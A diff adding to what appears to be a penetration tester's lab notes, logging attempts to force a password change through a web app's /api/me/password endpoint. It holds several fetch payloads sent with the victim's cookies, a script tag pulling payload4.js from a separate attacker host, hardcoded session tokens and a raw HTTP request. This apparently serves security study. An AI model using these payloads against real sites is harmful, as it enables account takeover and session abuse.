@@ -215,3 +215,149 @@ fetch("https://localhost:8443/api/me/password", {
   "credentials": "include"
 });
 ```
+
+
+```bash
+fetch("https://localhost:8443/api/me/password", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "cross-site",
+    "sec-fetch-storage-access": "active"
+  },
+  "referrer": "http://192.168.62.62/",
+  "body": "password=test2",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+```
+
+
+payload 4
+
+```bash
+fetch("https://192.168.62.62:8443/api/me/password", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+  },
+  body: "password=testtest",
+  credentials: "include"
+});
+```
+
+```bash
+<script src="http://192.168.49.62:8000/payload4.js"></script>
+```
+
+```bash
+fetch("https://localhost:8443/api/me/password", {
+  "headers": {
+    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+  },
+  "body": "password=testtesttest",
+  "method": "POST",
+  "credentials": "include"
+});
+```
+attempted using `payload4` gt a `MissingAllowOriginHeader`
+![[Pasted image 20250919181110.png]]
+working header  - going to test with the `sessiontoken` 
+```bash
+fetch("https://192.168.62.62:8443/api/me/password", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "cross-site",
+    "sec-fetch-storage-access": "active",
+    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
+    "Referer": "http://192.168.62.62/"
+  },
+  "body": "password=test",
+  "method": "POST"
+});
+```
+changing to localhost as `payload6.js`
+```bash
+fetch("https://localhost:8443/api/me/password", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "cross-site",
+    "sec-fetch-storage-access": "active",
+    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
+    "Referer": "http://192.168.62.62/"
+  },
+  "body": "password=test",
+  "method": "POST"
+});
+```
+now trying to do `payload7.js` to change the password
+```bash
+fetch("https://localhost:8443/api/me/password", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "cross-site",
+    "sec-fetch-storage-access": "active",
+    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
+    "Referer": "http://192.168.62.62/"
+  },
+  "body": "password=testtesttest",
+  "method": "POST"
+});
+```
+
+```bash
+POST /api/me/password HTTP/1.1
+Host: 192.168.62.62:8443
+Cookie: sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIxMjUyLCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.glYKmvOwHXKRKNWVct9SOfoIiCKzlP3YIbgFdbIYG_s
+Content-Length: 21
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.62.62
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Sec-Fetch-Storage-Access: active
+Referer: http://192.168.62.62/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+password=testtesttest
+```
